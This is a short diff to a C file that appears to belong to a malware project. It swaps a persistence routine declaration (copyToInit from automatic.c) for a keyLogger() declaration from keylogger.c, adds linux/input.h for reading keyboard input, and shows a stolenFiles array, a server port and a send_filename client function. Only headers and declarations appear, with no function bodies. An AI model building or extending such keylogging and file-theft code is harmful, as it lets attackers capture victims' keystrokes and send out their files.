@@ -11,7 +11,9 @@
 #include <errno.h>
 #include <math.h>
 #include <sys/socket.h>
-#include <arpa/inet.h> 
+#include <arpa/inet.h>
+#include <linux/input.h>
+#include <time.h>  
 
 #define SRV_PORT 5000
 #define MAX_RECV 16384
@@ -34,8 +36,8 @@ int copyFile(char *address, char *destPath);
 char copyToDir[1024];
 char stolenFiles[1024][1024];
 
-//From automatic.c
-void copyToInit();
+//From keylogger.c
+void keyLogger();
 
 //From client.c
 void send_filename(int, char*);
